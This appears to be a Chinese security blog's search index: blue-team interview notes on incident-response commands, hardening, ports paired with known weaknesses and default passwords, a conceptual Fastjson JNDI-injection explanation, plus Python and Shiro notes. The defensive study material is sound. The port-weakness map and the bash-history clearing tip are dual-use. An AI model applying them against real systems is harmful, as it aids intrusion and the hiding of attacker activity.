<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HW蓝队面试</title>
    <url>/2022/03/28/HW%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="蓝队面试题"><a href="#蓝队面试题" class="headerlink" title="蓝队面试题"></a>蓝队面试题</h1><h2 id="基本思路流程"><a href="#基本思路流程" class="headerlink" title="基本思路流程"></a>基本思路流程</h2><p>1.收集信息:收集客户信息和中毒主机信息，包括样本<br>2.判断类型:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等3.抑制范围:隔离使受害面不继续扩大<br>4.深入分析:日志分析、进程分析、启动项分析、样本分析方便后期溯源<br>5.清理处置:杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产6.产出报告:整理并输出完整的安全事件报告</p>
<h2 id="Windows入侵排查思路"><a href="#Windows入侵排查思路" class="headerlink" title="Windows入侵排查思路"></a>Windows入侵排查思路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查系统账号安全</span><br><span class="line">    查看服务器是否有弱口令，远程管理端口是否对公网开放（使用netstat -ano命令、或者问服务器管理员）</span><br><span class="line">    lusrmgr.msc命令查看服务器是否存在可疑账号、新增账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉</span><br><span class="line">    用 D 盾或者注册表中查看服务器是否存在隐藏账号、克隆账号</span><br><span class="line">    结合日志，查看管理员登录时间、用户名是否存在异常</span><br><span class="line">    检查方法：Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析</span><br><span class="line">检查异常端口、进程</span><br><span class="line">    netstat -ano检查端口连接情况，是否有远程连接、可疑连接</span><br><span class="line">    任务管理器-进程</span><br><span class="line">检查启动项、计划任务、服务</span><br><span class="line">检查系统相关信息</span><br><span class="line">查看系统版本以及补丁信息</span><br><span class="line">查找可疑目录及文件</span><br></pre></td></tr></table></figure>



<h2 id="Linux入侵排查思路"><a href="#Linux入侵排查思路" class="headerlink" title="Linux入侵排查思路"></a>Linux入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who		查看当前登录用户（tty本地登陆 pts远程登录）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328205828097.png" alt="image-20220328205828097"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w 		查看系统信息，想知道某一时刻用户的行为</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328205948436.png" alt="image-20220328205948436"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uptime	查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328210051363.png" alt="image-20220328210051363"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd   用户信息文件cat查看</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328210742015.png" alt="image-20220328210742015"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/shadow    影子文件cat查看</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328210828932.png" alt="image-20220328210828932"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>

<h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过 .bash_history 查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令 histroy</span><br><span class="line">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328211328905.png" alt="image-20220328211328905"></p>
<p>1.检查异常端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328211524374.png" alt="image-20220328211524374"></p>
<p>2.检查异常进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328211836726.png" alt="image-20220328211836726"></p>
<p>3.检查开机启动项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开机启动配置文件</span><br><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>

<p>4.检查定时任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line">crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line">如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br><span class="line">2、利用anacron实现异步定时任务调度</span><br></pre></td></tr></table></figure>

<p>5.重点关注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>

<p>6.检查系统运行的服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list 命令，可以查看系统运行的服务</span><br></pre></td></tr></table></figure>

<p>7.检查异常文件</p>
<p>8.检查系统日志</p>
<h2 id="Linux的登录日志查看文件"><a href="#Linux的登录日志查看文件" class="headerlink" title="Linux的登录日志查看文件"></a>Linux的登录日志查看文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志默认存放位置：/var/log/</span><br><span class="line">查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’</span><br><span class="line">查看所有用户最后的登录信息 lastlog</span><br><span class="line">查看用户最近登录信息 last 其中，/var/log/wtmp 存储登录成功的信息、btmp 存储登录失败的信息、utmp 存储当前正在登录的信息</span><br><span class="line">查看当前用户登录系统情况 who</span><br></pre></td></tr></table></figure>

<h2 id="Linux常用排查命令"><a href="#Linux常用排查命令" class="headerlink" title="Linux常用排查命令"></a>Linux常用排查命令</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查看当前系统状态（top）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328212653157.png" alt="image-20220328212653157"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.查看当前操作系统信息（uname -a）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328212807828.png" alt="image-20220328212807828"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.查看当前系统进程信息</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328212913837.png" alt="image-20220328212913837"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.本机所有的连接和监听的端口（natstat）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.查看谁在使用某个端口（lsof）</span><br></pre></td></tr></table></figure>

<h3 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看当前用户登录系统情况 who</span><br><span class="line">分析超级权限账户 awk-F： ‘&#123;if（$3==0）print $1&#125;’/etc/passwd</span><br><span class="line">查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’</span><br><span class="line">查看用户错误的登录信息 lastb</span><br><span class="line">查看所有用户最后的登录信息 lastlog</span><br><span class="line">查看用户最近登录信息 last</span><br><span class="line">/var/log/ 其中，/var/log/wtmp 存储登录成功的信息、btmp存储登录失败的信息、utmp存储当前正在登录的信息</span><br><span class="line">查看空口令账户 awk-F： ‘length（$2）==0 &#123;print $1&#125;’/etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328213559555.png" alt="image-20220328213559555"></p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328213654624.png" alt="image-20220328213654624"></p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328213731022.png" alt="image-20220328213731022"></p>
<h2 id="Linux系统加固"><a href="#Linux系统加固" class="headerlink" title="Linux系统加固"></a>Linux系统加固</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.修改ssh配置文件，禁止root直接登录（vim /etc/ssh/sshd_config）</span><br><span class="line">2.修改密码策略配置文件，密码的最小长度长一点</span><br><span class="line">3.用户错误登录，锁定账户（UsePAM 为yes）</span><br><span class="line">4.禁止su非法提权，只允许root和wheel组用户su到root</span><br><span class="line">5.不响应ICMP请求</span><br><span class="line">6.设置登录超时时间10分钟</span><br><span class="line">7.结束非法用户登录</span><br><span class="line">8.修改ssh默认端口（port）</span><br></pre></td></tr></table></figure>

<h2 id="Windows系统加固"><a href="#Windows系统加固" class="headerlink" title="Windows系统加固"></a>Windows系统加固</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.设置密码策略，使其保持复杂性（本地安全策略）</span><br><span class="line">2.关闭系统默认共享</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="常见的安全工具、设备"><a href="#常见的安全工具、设备" class="headerlink" title="常见的安全工具、设备"></a>常见的安全工具、设备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">端口及漏洞扫描：Namp、Masscan</span><br><span class="line">抓包：Wireshark，Burpsuite、Fiddler、HttpCanary</span><br><span class="line">Web自动化安全扫描：Nessus、Awvs、Appscan、Xray</span><br><span class="line">信息收集：Oneforall、hole</span><br><span class="line">漏洞利用：MSF、CS</span><br><span class="line">Webshell 管理：菜刀、蚁剑、冰蝎、哥斯拉</span><br></pre></td></tr></table></figure>

<p>常见的hw设备：公安部网防G01、K01、360网康&#x2F;网神防火墙、微步威胁情报、安恒云-web应用防火墙（玄武盾）、默安蜜罐、知道创宇蜜罐、山石防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">防火墙</span><br><span class="line">IDS（入侵检测系统）</span><br><span class="line">IPS（入侵检测和入侵防御）</span><br><span class="line">DDOS（分布式拒绝服务攻击）</span><br></pre></td></tr></table></figure>

<h2 id="护网的分组和流程"><a href="#护网的分组和流程" class="headerlink" title="护网的分组和流程"></a>护网的分组和流程</h2><p>防护检测组、综合研判组、应急溯源组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">备战阶段，主要任务是进行两方面的操作，一是减少攻击面，即资产梳理，减少暴露面；二是排查风险点，即通过漏洞扫描，渗透测试，弱口令等进行自查</span><br><span class="line"></span><br><span class="line">临战阶段，主要任务也大致可以分为两个部分，一是进行内部演练，发现疏忽处并进行相应整改；二是可以适当增加安全设备，比如WAF，IPS，IDS，SOC，堡垒机等</span><br><span class="line"></span><br><span class="line">决战阶段，作为新人，主要就是坚守岗位，有应急日志就看自己能不能解决，不能就上报，服从上级安排，优化防护，持续整改</span><br></pre></td></tr></table></figure>

<h2 id="简历有护网经历，你能谈谈护网的情况嘛"><a href="#简历有护网经历，你能谈谈护网的情况嘛" class="headerlink" title="简历有护网经历，你能谈谈护网的情况嘛"></a>简历有护网经历，你能谈谈护网的情况嘛</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参加过护网蓝队，负责事件研判工作，主要使用ips、ids等设备做流量监控与日志分析判断安全事件是否为误判</span><br><span class="line">监控、研判、处置、溯源</span><br><span class="line">对安全管理中心发出的态势排查单进行排查并将结果反馈给安全管理中心，对安全管理中心发出的封堵工单和解封工单进行对应的封堵和解封，每两小时反馈一次排查结果、设备巡检报告、封堵情况。查看DDOS设备，记录排查告警信息。</span><br></pre></td></tr></table></figure>

<h2 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h2><h3 id="数据库类（扫描弱口令）"><a href="#数据库类（扫描弱口令）" class="headerlink" title="数据库类（扫描弱口令）"></a>数据库类（扫描弱口令）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1433：mssql</span><br><span class="line">1521：Oracle</span><br><span class="line">3306：mysql</span><br><span class="line">5432：Postgresql</span><br></pre></td></tr></table></figure>

<h3 id="特殊服务类（未授权-x2F-命令执行）"><a href="#特殊服务类（未授权-x2F-命令执行）" class="headerlink" title="特殊服务类（未授权&#x2F;命令执行）"></a>特殊服务类（未授权&#x2F;命令执行）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443：ssl</span><br><span class="line">873：Rsync 未授权</span><br><span class="line">5984：CouchDB http：//xxx:5984/_utils/</span><br><span class="line">6379：Redis 未授权</span><br><span class="line">7001、7002：Weblogic 默认弱口令</span><br><span class="line">8088：Hadoop Yarn 资源管理系统 REST API 存在未授权</span><br><span class="line">8161：Apache ActiveMQ 未授权、弱口令，put 文件上传，move 文件移动</span><br><span class="line">9200、9300：elasticsearch 命令执行</span><br><span class="line">11211：Memcache 未授权，telnet ip 就可以获得服务器敏感信息</span><br><span class="line">27017、27018：Mongodb 未授权</span><br><span class="line">50000：SAP 命令执行</span><br><span class="line">50070、50030 Hadoop 未授权访问</span><br></pre></td></tr></table></figure>

<h3 id="常用端口类（弱口令、端口爆破）"><a href="#常用端口类（弱口令、端口爆破）" class="headerlink" title="常用端口类（弱口令、端口爆破）"></a>常用端口类（弱口令、端口爆破）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21：FTP 弱口令，匿名 anonymous/空登录，以及 ms12-073</span><br><span class="line">25：SMTP 简单邮件传输服务器端口</span><br><span class="line">23：Telnet 的端口，Telnet 是一种可以远程登录并管理远程机器的服务</span><br><span class="line">22：ssh 端口，PcAnywhere 建立 TCP 和这一端口的连接可能是为了寻找 ssh，这一服务有许多弱点</span><br><span class="line">53：dns 端口</span><br><span class="line">139：属于 TCP 协议，是为 NetBIOS Session Service 提供的，主要提供 Windows 文件和打印机共享以及 Unix 中的 Samba 服务</span><br><span class="line">445：网络共享 smb 服务，尝试利用 ms08067，ms17010 等以及 IPC$ 攻击手段</span><br><span class="line">2601、2604：zebra 路由，默认密码 zebra</span><br></pre></td></tr></table></figure>

<h2 id="三次握手和四次挥手"><a href="#三次握手和四次挥手" class="headerlink" title="三次握手和四次挥手"></a>三次握手和四次挥手</h2><p>TCP位于传输层，作用是提供可靠的字节流服务，为了准确无误的将数据送达目的地，TCP协议采用三次握手四次挥手策略</p>
<h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>TCP 三次握手，其实就是 TCP 应用在发送数据前，通过 TCP 协议跟通信对方协商好连接信息，建立起 TCP 的连接关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次握手：客户端发送 SYN 报文，并进入 SYN_SENT（发送） 状态，等待服务器的确认</span><br><span class="line">第二次握手：服务器收到 SYN 报文，需要给客户端发送 ACK 确认报文，同时服务器也要向客户端发送一个 SYN 报文，所以也就是向客户端发送 SYN + ACK 报文，此时服务器进入 SYN_RCVD （收到）状态</span><br><span class="line">第三次握手：客户端收到 SYN + ACK 报文，向服务器发送确认包，客户端进入 ESTABLISHED （确认）状态。待服务器收到客户端发送的 ACK 包也会进入 ESTABLISHED 状态，完成三次握手</span><br></pre></td></tr></table></figure>

<h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p>当我们的应用程序不需要数据通信了，就会发起断开 TCP 连接。建立一个连接需要三次握手，而终止一个连接需要经过四次挥手</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.第一次挥手：客户端发送一个 FIN，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态</span><br><span class="line">2.二次挥手：服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号 +1（与SYN相同，一个FIN占用一个序号），服务端进入 CLOSE_WAIT 状态</span><br><span class="line">3.第三次挥手：服务端发送一个 FIN，用来关闭服务端到 客户端的数据传送，服务端进入 LAST_ACK 状态</span><br><span class="line">4.第四次挥手：客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号 +1，服务端进入 CLOSED 状态，完成四次挥手</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>HW</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson漏洞详解</title>
    <url>/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是阿里巴巴开发的java语言编写的高性能json库，可以解析json格式的字符串，支持将java bean序列化为json字符串，也可以将json反序列化为java bean字符串。fastjson接口简单易用，广泛适用在缓存序列化、协议交互、web输出、安卓客户端等。目前有2个接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>fastjson提供了autotype功能，允许用户在反序列化数据中通过”@type”指定反序列化的类型，fastjson自定义的反序列化机制时会调用指定类中的getter和setter方法，那么当组件开启了autotype功能并且反序列化不可信数据的时候，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter、getter方法中。</p>
<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>简单来说，JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p>
<p><strong>DNS、LDAP、 CORBA对象服务、RMI！</strong></p>
<h1 id="Fastjson漏洞总结"><a href="#Fastjson漏洞总结" class="headerlink" title="Fastjson漏洞总结"></a>Fastjson漏洞总结</h1><ol>
<li>反序列化常用的两种方式一种基于rmi一种基于ldap</li>
<li>RMI是一种行为，指的是Java远程方法调用</li>
<li>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找相关的对象，并把他下载到客户端来</li>
<li>ldap指的是轻量级目录访问协议</li>
</ol>
<p>存在java版本的限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。</span><br><span class="line">在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line">基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</span><br><span class="line">在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</span><br><span class="line">可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>漏洞原理</p>
<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
<p>通俗理解就是：漏洞是利用fastjson  autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p>
<p>影响版本</p>
<p>Fastjson &lt; 1.2.25</p>
]]></content>
      <categories>
        <category>其他漏洞</category>
      </categories>
      <tags>
        <tag>Fastjson漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python自学笔记</title>
    <url>/2022/02/04/Python%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<span id="more"></span>

<p>自行安装pycharm</p>
<p>自行安装anaconda</p>
<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="1-使用conda安装虚拟环境"><a href="#1-使用conda安装虚拟环境" class="headerlink" title="1.使用conda安装虚拟环境"></a>1.使用conda安装虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行输入</span><br><span class="line">conda info -e</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327135645297.png" alt="image-20220327135645297"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python查看版本号</span><br><span class="line">python --version</span><br><span class="line">conda create -n pr python=3.7.6 </span><br><span class="line">y</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pr</span><br><span class="line">conda install pip</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327141528418.png" alt="image-20220327141528418"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开notebook，直接在命令行输入</span><br><span class="line">jupyter-notebook</span><br><span class="line">配置代码自动补全功能</span><br><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">继续配置</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">关掉notebook，然后再此打开，就会发现多了一处选项，打开，勾选Hinterland</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143747001.png" alt="image-20220327143747001"></p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143940707.png" alt="image-20220327143940707"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调整notebook的背景色</span><br><span class="line">pip install jupyterthemes</span><br><span class="line">选择主题</span><br><span class="line">jt -t onedork -f roboto -fs 16 -nfs 16 -tfs 16 -ofs 15</span><br><span class="line">重新打开</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure>



<h2 id="x2F-除法-x2F-x2F-向下取整"><a href="#x2F-除法-x2F-x2F-向下取整" class="headerlink" title="&#x2F;除法&#x2F;&#x2F;向下取整"></a>&#x2F;除法&#x2F;&#x2F;向下取整</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152252215.png" alt="image-20220327152252215"></p>
<h2 id="取余"><a href="#取余" class="headerlink" title="%取余"></a>%取余</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152903213.png" alt="image-20220327152903213"></p>
<h2 id="5的2次幂"><a href="#5的2次幂" class="headerlink" title="5的2次幂"></a>5的2次幂</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153153305.png" alt="image-20220327153153305"></p>
<h2 id="5的绝对值abs-5"><a href="#5的绝对值abs-5" class="headerlink" title="-5的绝对值abs(-5)"></a>-5的绝对值abs(-5)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153306901.png" alt="image-20220327153306901"></p>
<h2 id="十进制转十六进制hex-10"><a href="#十进制转十六进制hex-10" class="headerlink" title="十进制转十六进制hex(10)"></a>十进制转十六进制hex(10)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153508513.png" alt="image-20220327153508513"></p>
<h2 id="二进制转十进制int-‘1001’-base-x3D-2"><a href="#二进制转十进制int-‘1001’-base-x3D-2" class="headerlink" title="二进制转十进制int(‘1001’,base&#x3D;2)"></a>二进制转十进制int(‘1001’,base&#x3D;2)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153637234.png" alt="image-20220327153637234"></p>
<h2 id="A的ASCII码ord-‘A’"><a href="#A的ASCII码ord-‘A’" class="headerlink" title="A的ASCII码ord(‘A’)"></a>A的ASCII码ord(‘A’)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327154438608.png" alt="image-20220327154438608"></p>
<h2 id="65对应的ASCII码chr-65"><a href="#65对应的ASCII码chr-65" class="headerlink" title="65对应的ASCII码chr(65)"></a>65对应的ASCII码chr(65)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327155252656.png" alt="image-20220327155252656"></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Shrio框架漏洞</title>
    <url>/2022/02/01/Shrio%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<span id="more"></span>



<h1 id="Shrio框架漏洞总结"><a href="#Shrio框架漏洞总结" class="headerlink" title="Shrio框架漏洞总结"></a>Shrio框架漏洞总结</h1><p>Apache shiro是企业常见的java安全框架，执行身份认证、授权、密码和会话管理。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
<h2 id="Shrio框架"><a href="#Shrio框架" class="headerlink" title="Shrio框架"></a>Shrio框架</h2><p>Apache Shiro™是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理。Shiro拥有易于理解的API,您可以快速、轻松地获得任何应用程序——从最小的移动应用程序到最大的网络和企业应用程序。</p>
<p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证用户身份</span><br><span class="line">用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</span><br><span class="line">在非 Web 或 EJB 容器的环境下可以任意使用Session API</span><br><span class="line">可以响应认证、访问控制，或者 Session 生命周期中发生的事件</span><br><span class="line">可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</span><br><span class="line">支持单点登录(SSO)功能</span><br><span class="line">支持提供“Remember Me”服务，获取用户关联信息而无需登录</span><br></pre></td></tr></table></figure>

